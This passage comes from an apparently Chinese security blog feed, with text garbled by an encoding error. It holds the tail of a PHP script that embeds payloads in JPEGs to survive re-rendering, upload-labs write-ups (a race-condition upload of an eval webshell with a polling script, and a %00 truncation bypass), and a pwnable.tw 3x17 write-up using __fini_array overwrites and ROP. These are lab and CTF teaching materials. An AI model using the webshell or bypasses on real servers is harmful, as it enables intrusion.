invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="æ¡ä»¶ç«äº‰"><a href="#æ¡ä»¶ç«äº‰" class="headerlink" title="æ¡ä»¶ç«äº‰"></a>æ¡ä»¶ç«äº‰</h2><p>&#x3D;&#x3D;Pass-18&#x3D;&#x3D;</p>
<p>æŸ¥çœ‹æç¤ºéœ€è¦ä»£ç å®¡è®¡</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131913099.png" alt="image-20241018220600826" style="zoom:50%;" />

<p>â€‹	ä½¿ç”¨<code>move_uploaded_file()</code>å‡½æ•°ï¼Œå°†ä¸Šä¼ çš„æ–‡ä»¶ä¿å­˜åˆ°æœåŠ¡å™¨ï¼Œå†è¿›è¡Œåˆ¤æ–­æ˜¯å¦æ˜¯<code>jpgã€pngã€gif</code>ä¸­çš„ä¸€ç§ç±»å‹ï¼Œå¦‚æœåœ¨æ•°ç»„ä¸­å°±ä¿å­˜é‡å‘½åï¼Œå¦‚æœä¸åœ¨æ ¹æ®<code>unlink()</code>å°±ç›´æ¥åˆ é™¤</p>
<p>â€‹	ä»£ç ä»–æ˜¯å…ˆå°†å›¾ç‰‡ä¸Šä¼ ä¸Šå»ï¼Œæ‰å¼€å§‹è¿›è¡Œåˆ¤æ–­åç¼€åã€äºŒæ¬¡æ¸²æŸ“ã€‚å¦‚æœåœ¨ä¸Šä¼ ä¸Šå»çš„ä¸€ç¬é—´è®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼Œé‚£ä»–å°±ä¸èƒ½å¯¹è¿™ä¸ªæ–‡ä»¶åˆ é™¤ã€äºŒæ¬¡æ¸²æŸ“ã€‚è¿™å°±ç›¸å½“äºæˆ‘ä»¬æ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åå†å»åˆ é™¤è¿™ä¸ªæ–‡ä»¶ï¼Œå°±ä¼šæç¤ºè¿™ä¸ªæ–‡ä»¶åœ¨å¦ä¸€ç¨‹åºä¸­æ‰“å¼€æ— æ³•åˆ é™¤ã€‚</p>
<p><strong>é€šå…³æ­¥éª¤ï¼š</strong></p>
<p>ä¸Šä¼ <code>&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;</code>ç„¶å<code>bp</code>æ‹¦æˆªï¼Œå‘é€åˆ°<code>Intruder</code></p>
<p>è®¾ç½®<code>payload</code>ç±»å‹</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131912203.png" alt="image-20241018220215886" style="zoom:50%;" />

<p>å¢å¤šçº¿ç¨‹æ•°</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131912712.png" alt="image-20241018220239756" style="zoom:50%;" />

<p>å¼€å§‹æ”»å‡»ï¼Œç„¶åè¿è¡Œè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://172.20.10.10/uploads/upload/1.php&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    html = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> html.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="00æˆªæ–­ç»•è¿‡"><a href="#00æˆªæ–­ç»•è¿‡" class="headerlink" title="%00æˆªæ–­ç»•è¿‡"></a><code>%00</code>æˆªæ–­ç»•è¿‡</h2><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131912556.png" alt="image-20241018230053056" style="zoom:50%;" />

<ul>
<li>é»‘åå•ä¸­æ²¡æœ‰è¿‡æ»¤<code>PHP</code>ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨å¤§å†™ç»•è¿‡</li>
<li>é€šè¿‡<code>move_upload_file()</code>å‡½æ•°ç§»åŠ¨æ–‡ä»¶<ul>
<li>å› æ­¤å¯ä»¥ä¿®æ”¹åç¼€ä¸º<code>php/.</code>ï¼Œ<code>php/.</code>å¯ä»¥ç»•è¿‡é»‘åå•ï¼Œ<code>move_upload_file()</code>å‡½æ•°ä¼šåˆ é™¤æœ«å°¾çš„<code>/.</code></li>
<li>æˆ–è€…åˆ©ç”¨<code>%00</code>æˆªæ–­ç»•è¿‡</li>
</ul>
</li>
<li><code>$file_name</code>æ˜¯é€šè¿‡<code>POST</code>ä¼ å‚è·å–çš„ï¼Œ<code>bp</code>æŠ“åŒ…ä¿®æ”¹åº”<code>POST</code>å‚æ•°åç¼€ä¸º<code>PHP</code></li>
</ul>
<p>æœ€åå†ä»‹ç»ä¸€ä¸‹<code>%00</code>æˆªæ–­ç»•è¿‡çš„æ–¹æ³•</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131911620.png" alt="image-20241018232435030"></p>
<p>å‘é€ä¸Šä¼ æˆåŠŸåï¼Œæ‰“å¼€å›¾åƒé“¾æ¥</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131911041.png" alt="image-20241018232615034" style="zoom:50%;" />

<p>æˆåŠŸè§£æè„šæœ¬</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131911844.png" alt="image-20241018232640959" style="zoom:50%;" />
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>webå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.tw writeup-3x17</title>
    <url>/2024/07/12/writeup-3x17/</url>
    <content><![CDATA[<h3 id="å­¦ä¹ ä¸æ”¶è·"><a href="#å­¦ä¹ ä¸æ”¶è·" class="headerlink" title="å­¦ä¹ ä¸æ”¶è·"></a>å­¦ä¹ ä¸æ”¶è·</h3><ol>
<li><p><code>ida</code>ä¸­ï¼Œäº¤å‰å¼•ç”¨<code>X</code>ï¼Œå¯¹å‡½æ•°è¿›è¡Œé‡å‘½å<code>N</code>ã€‚</p>
</li>
<li><p>ç¨‹åºæœ€å¼€å§‹æ‰§è¡Œçš„æ˜¯<code>start</code>å‡½æ•°ï¼Œ<code>start</code>è°ƒç”¨<code>__libc_start_main</code>å‡½æ•°ï¼Œç„¶åç¨‹åºæ‰§è¡Œ<code>__libc_csu_init</code>å‡½æ•°ï¼Œæ¥ç€æ‰æ‰§è¡Œ<code>main</code>å‡½æ•°ï¼Œæœ€åæ‰§è¡Œ<code>__libc_csu_fini</code>å‡½æ•°ã€‚<code>__libc_start_main</code>çš„å‡½æ•°åŸå‹æ˜¯<code>__libc_start_main(main,argc,ubp_av,init,fini,rtld_fini)</code>ã€‚</p>
<span id="more"></span>
</li>
<li><p>åœ¨<code>__libc_csu_init</code>å‡½æ•°ä¸­ç¨‹åºä¼šæ‰§è¡Œ<code>_init,__init_array[0],__init_array[1]...__init_array[n]</code>ï¼Œåœ¨<code>__libc_csu_fini</code>å‡½æ•°ä¸­ç¨‹åºä¼šæ‰§è¡Œ<code>__fini_array[n]...__fini_array[1],__fini_array[0],_fini</code>ã€‚</p>
</li>
</ol>
<h3 id="ä¿æŠ¤"><a href="#ä¿æŠ¤" class="headerlink" title="ä¿æŠ¤"></a>ä¿æŠ¤</h3><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202227301.png" alt="1"></p>
<h3 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h3><h4 id="å¯»æ‰¾-main-å‡½æ•°"><a href="#å¯»æ‰¾-main-å‡½æ•°" class="headerlink" title="å¯»æ‰¾_main_å‡½æ•°"></a>å¯»æ‰¾_main_å‡½æ•°</h4><p>é™æ€é“¾æ¥çš„ç¨‹åºï¼Œå‡½æ•°åç¬¦å·è¡¨éƒ½è¢«å»é™¤äº†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹ä¸¤ç§æ–¹æ³•å¯»æ‰¾<em>main</em>å‡½æ•°</p>
<p>è¿è¡Œç¨‹åºå¯ä»¥å‘ç°å…³é”®å­—ç¬¦ä¸²<em>addr:<em>ï¼Œåœ¨</em>ida</em>ä¸­åŒå‡»<em>addr:</em></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202227737.png" alt="2"></p>
<p>ç„¶åç‚¹å‡»<em>buf</em>ï¼Œå¹¶è¿›è¡Œäº¤å‰å¼•ç”¨<code>X</code>ï¼Œå¦‚å›¾<code>0x401B6D</code>å°±æ˜¯<em>main</em>å‡½æ•°çš„åœ°å€</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202227710.png" alt="3"></p>
<p>ç¬¬äºŒç§æ–¹æ³•å…¶å®å°±æ˜¯å»æ¢ç©¶<em>main</em>æ˜¯æ€ä¹ˆå‡ºç°çš„ã€‚</p>
<p>é¦–å…ˆé€šè¿‡å‘½ä»¤<code>readelf -h 3x17</code>ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹ç¨‹åºçš„äººå£åœ°å€ï¼Œå¦‚å›¾æ˜¯<code>0x401a50</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202227397.png" alt="4"></p>
<p>å¯ä»¥ç”¨<code>G</code>ï¼Œåœ¨<em>ida</em>ä¸­æœç´¢åœ°å€ï¼Œå‘ç°å°±æ˜¯<em>start</em>å‡½æ•°çš„åœ°å€ï¼Œæ•…ç¨‹åºè¿è¡Œçš„ç¬¬ä¸€ä¸ªå‡½æ•°å…¶å®æ˜¯<em>start</em>å‡½æ•°</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202228584.png" alt="5"></p>
<p>å°†ä¸€ä¸ªæ­£å¸¸çš„ç¨‹åºçš„<em>start</em>å‡½æ•°ï¼Œä¸è¯¥ç¨‹åºçš„<em>start</em>å‡½æ•°å¯¹æ¯”ï¼Œå¯ä»¥å‘ç°äºŒè€…å‡ ä¹å®Œå…¨ç›¸åŒ</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202501202228194.png" alt="6"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public start</span><br><span class="line">start proc near</span><br><span class="line">; __unwind &#123;</span><br><span class="line">xor     ebp, ebp</span><br><span class="line">mov     r9, rdx  ;rtld_fini</span><br><span class="line">pop     rsi  ;argc</span><br><span class="line">mov     rdx, rsp  ;ubp_av</span><br><span class="line">and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">push    rax</span><br><span class="line">push    rsp  ;stack_end</span><br><span class="line">mov     r8, offset sub_402960  ;fini</span><br><span class="line">mov     rcx, offset sub_4028D0  ;init</span><br><span class="line">mov     rdi, offset sub_401B6D  ;main</span><br><span class="line">db      67h</span><br><span class="line">call    sub_401EB0  ;__libc_start_main</span><br><span class="line">hlt</span><br><span class="line">; &#125; // starts at 401A50</span><br><span class="line">start endp</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥*__libc_start_main<em>å‡½æ•°çš„åŸå‹å¦‚ä¸‹ï¼Œä¸æ­¤åŒæ—¶æˆ‘ä»¬ä¹Ÿå°±æ‰¾åˆ°äº†</em>main*å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__libc_start_main(main,argc,ubp_av,init,fini,rtld_fini)</span><br><span class="line"><span class="comment">//è¿™é‡Œè¯´ä¸€ä¸‹64ä½ç¨‹åºå‡½æ•°ä¼ å‚å¯„å­˜å™¨ä¾æ¬¡ä¸ºï¼šrdi,rsi,rdx,rcx,r8,r9,r10</span></span><br></pre></td></tr></table></figure>

<p>æœ€åæˆ‘ä»¬å¯ä»¥ç”¨<code>N</code>ï¼Œåœ¨<em>ida</em>ä¸­å¯¹å‡½æ•°è¿›è¡Œé‡å‘½å</p>
<h4 id="åˆ†æ-libc-csu-fini-å‡½æ•°"><a href="#åˆ†æ-libc-csu-fini-å‡½æ•°" class="headerlink" title="åˆ†æ___libc_csu_fini_å‡½æ•°"></a>åˆ†æ___libc_csu_fini_å‡½æ•°</h4><p>ä¸‹é¢æ˜¯*__libc_csu_fini*å‡½æ•°çš„æ±‡ç¼–ä»£ç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000402960 fini            proc near               ; DATA XREF: start+Fâ†‘o</span><br><span class="line">.text:0000000000402960 ; __unwind &#123;</span><br><span class="line">.text:0000000000402960                 push    rbp</span><br><span class="line">.text:0000000000402961                 lea     rax, unk_4B4100 </span><br><span class="line">.text:0000000000402968                 lea     rbp, off_4B40F0  #__fini_array</span><br><span class="line">.text:000000000040296F                 push    rbx</span><br><span class="line">.text:0000000000402970                 sub     rax, rbp</span><br><span class="line">.text:0000000000402973                 sub     rsp, 8</span><br><span class="line">.text:0000000000402977                 sar     rax, 3</span><br><span class="line">.text:000000000040297B                 jz      short loc_402996</span><br><span class="line">.text:000000000040297D                 lea     rbx, [rax-1]</span><br><span class="line">.text:0000000000402981                 nop     dword ptr [rax+00000000h]</span><br><span class="line">.text:0000000000402988</span><br><span class="line">.text:0000000000402988 loc_402988:                             ; CODE XREF: fini+34â†“j</span><br><span class="line">.text:0000000000402988                 call    qword ptr [rbp+rbx*8+0]  ;</span><br><span class="line">.text:000000000040298C                 sub     rbx, 1</span><br><span class="line">.text:0000000000402990                 cmp     rbx, 0FFFFFFFFFFFFFFFFh</span><br><span class="line">.text:0000000000402994                 jnz     short loc_402988</span><br><span class="line">.text:0000000000402996</span><br><span class="line">.text:0000000000402996 loc_402996:                             ; CODE XREF: fini+1Bâ†‘j</span><br><span class="line">.text:0000000000402996                 add     rsp, 8</span><br><span class="line">.text:000000000040299A                 pop     rbx</span><br><span class="line">.text:000000000040299B                 pop     rbp</span><br><span class="line">.text:000000000040299C                 jmp     _term_proc</span><br><span class="line">.text:000000000040299C ; &#125; // starts at 402960</span><br><span class="line">.text:000000000040299C fini            endp</span><br></pre></td></tr></table></figure>

<p>â€‹	<em>__fini_array</em>æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œ<code>0x4b40f0</code>æ˜¯*__fini_array<em>çš„é¦–åœ°å€ï¼Œåœ¨</em>gdb<em>è°ƒè¯•çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°<code>__libc_csu_fini</code>è¿™ä¸ªå‡½æ•°å…¶å®å°±æ˜¯å…ˆè°ƒç”¨</em>__fini_array[1]<em>ï¼Œå†æ‰§è¡Œ</em>__fini_array[0]*ã€‚</p>
<h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>â€‹	è¿è¡Œç¨‹åºåç¨‹åºè®©æˆ‘ä»¬å…ˆè¾“å…¥ä¸€ä¸ªåœ°å€ï¼Œå†è¾“å…¥æ•°æ®ï¼Œæ¼æ´ç‚¹å¯èƒ½æ˜¯ä»»æ„åœ°å€æ”¹å†™ã€‚è€Œæˆ‘ä»¬åˆçŸ¥é“*__libc_csu_fini<em>å‡½æ•°ä¼šå…ˆæ‰§è¡Œ</em>__fini_array[1]<em>ï¼Œå†æ‰§è¡Œ</em>__fini_array[0]<em>ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬æŠŠ</em>main<em>å‡½æ•°åœ°å€å†™åˆ°</em>__fini_array[1]*ä¸­ï¼Œç¨‹åºæ˜¯ä¸æ˜¯å°±ä¼šä¸€ç›´å¾ªç¯å†™å…¥å†…å®¹ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&quot;addr:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x4b40f8</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;data:&quot;</span>,p64(<span class="number">0x401b6d</span>))</span><br></pre></td></tr></table></figure>

<p>è¯•äº†ä¸€ä¸‹åå‘ç°è¿™æ ·ä¸è¡Œï¼Œåæ¥å‘ç°è¿˜è¦æŠŠ*__libc_csu_fini<em>å‡½æ•°å†™åˆ°</em>__fini_array[0]*ä¸­ï¼Œå¦‚å›¾ï¼Œè¿™æ ·å°±å¯ä»¥ä¸€ç›´å¾ªç¯å†™äº†ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&quot;addr:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x4b40f0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;data:&quot;</span>,p64(<span class="number">0x401b6d</span>)+p64(<span class="number">0x402960</span>))</span><br><span class="line"><span class="comment">#ç¨‹åºä¼šå…ˆæŠŠmainå†™åˆ°__fini_array[0]ï¼Œå†æŠŠ0x402960å†™åˆ°__fini_array[0]çš„ä¸‹ä¸€ä¸ªå†…å­˜å•å…ƒï¼Œå³__fini_array[1]ä¸­</span></span><br></pre></td></tr></table></figure>

<p>ç”±äºè¯»å…¥æœ‰å­—æ•°é™åˆ¶ï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡å¤šæ¬¡ä»»æ„åœ°å€å†™åœ¨*__fini_array+0x10<em>å¸ƒç½®æˆ‘ä»¬æ„é€ çš„</em>rop<em>é“¾ï¼Œç„¶åæˆ‘ä»¬å†é€šè¿‡æ ˆè¿ç§»ï¼Œå°†æ ˆè¿ç§»åˆ°_fini_array+0x10_ä¸Šï¼Œå»æ‰§è¡Œ</em>ROP*é“¾ã€‚</p>
<p>è¿˜æœ‰ä¸€ç‚¹ï¼Œä¸€å¼€å§‹æˆ‘ä»¥<code>p64()</code>å½¢å¼å‘é€<em>addr</em>çš„æ—¶å€™ï¼Œç¬¬äºŒæ¬¡è¯»å…¥<em>read</em>å‡½æ•°çš„<em>rdi</em>æ€»æ˜¯ä¸º<code>0</code>ï¼Œä½†æ˜¯ä»¥<code>str()</code>å½¢å¼å‘é€åå°±æ²¡é—®é¢˜äº†ã€‚</p>
